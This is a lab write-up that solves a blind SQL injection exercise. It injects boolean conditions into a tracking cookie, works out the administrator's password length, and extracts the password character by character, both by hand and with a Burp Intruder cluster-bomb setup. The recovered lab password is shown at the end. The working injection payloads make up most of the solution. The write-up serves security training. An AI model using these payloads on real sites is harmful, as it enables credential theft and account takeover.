Difficulty: `Practitioner`

## 🎯 Goal

This lab contains a blind SQLi vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "**Welcome back**" message in the page if the query returns any rows.

The database contains a different table called ``users``, with columns called ``username`` and ``password``. You need to exploit the blind SQL injection vulnerability to find out the password of the ``administrator`` user.

To solve the lab, log in as the ``administrator`` user.

## ✅ Solution

First, let's capture the request into Burp to see what it looks like:

````http
GET / HTTP/2
Host: <host>
Cookie: TrackingId=inef9UVjAF4GJLdj; session=86UdOy9CSRpdDtjDrCqiziIuKdAog6uR
Cache-Control: max-age=0
[...]
````

We know the query behind the ``TrackingId`` is vulnerable to blind SQLi and a ``Welcome back`` message is displayed when the query returns ``true``.

We can test this behaviour with a basic test:

````s
TrackingId=inef9UVjAF4GJLdj' AND '1'='1;    # Welcome back
TrackingId=inef9UVjAF4GJLdj' AND '1'='2;    # Nothing
````

Let's be sure there is a `users` table:

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users LIMIT 1)='a     # Welcolme back
````

Let's be sure there is an `administrator` user:

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator')='a      # Welcolme back
````

Before guessing the password we have to find its length. I could automate it but usually password aren't that long :(

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a     # Welcome back: password length > 1 char
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a    # Welcome back: password length > 10 chars
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a    # Nothing: password length <= 20 chars
````

Ok so password is between 10 and 20 chars. Let's try one by one now.

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a    # Welcome back: password length = 20 chars
TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=19)='a    # Nothing: password length != 19 chars
````

The password is ``20`` characters long.

Now time to guess the password. Two possibilities:

- Manually checking every characters at every position (boring)
- Automate with Burp Intruder to send hundreds of requests for us (cool)

Even if we should always automate everything as much as we can I will still present the manual way to show how it is working.

### 1. Manual password guessing

We will have to test one by one every character possible for every position. It's written the password only includes lowercase alphanumeric characters ([a-z][0-9]) and there are 20 positions (the password length) so it's a total of ``36 * 20 = 720`` posibilities...

Because it is too much to do manually I will only explain the principle behind: test every character for every position.

This query uses the ``SUBSTRING()`` function to extract a single character from the password, and test it against a specific value, here `a` at the position `1`. and `9` at the position `20`.

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a      # First request
TrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='9     # Last request
````

Assuming I successfully sent the 720 requests without errors I should have found the password.

### 2. Automate password guessing

I have the Burp Suite Community Edition so I have some feature and throttle limitation but it's doing the work good.

First we have to send the request to the ``Intruder`` with ``ctrl+i``.

In the ``Positions`` tab select ``Cluster bomb``.

The payload positions will be the password character position and the character to test, as the following:

````s
TrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
````

In the Payloads tab:

- payload set 1 will be ``Numbers``
  - from ``1``
  - to ``20``
  - step of ``1``
- payload set 2 will be ``Brute forcer``
  - character set `abcdefghijklmnopqrstuvwxyz0123456789`
  - min length ``1``
  - max length ``1``

When everything is correctly set we can start the attack. Because the CE edition has a request rate limit of 1 per second it took 10+ minutes to end.

We can sort the result responses on their length because the responses with the Welcolme back message will be longuer than those without.

_Burp Cluster bomb attack results_

We obtain a table like below revealing the password!

|   1   |   2   |    3 |   4   |   5   |   6   |   7   |   8   |   9   |  10   |  11   |  12   |  13   |  14   |  15   |  16   |  17   |  18   |  19   |  20   |
| :---: | :---: | ---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
|   5   |   k   |    y |   j   |   d   |   q   |   4   |   y   |   a   |   q   |   6   |   0   |   q   |   j   |   6   |   6   |   6   |   7   |   4   |   1   |

We can now log in as the ``administrator`` user using the password ``5kyjdq4yaq60qj666741``.
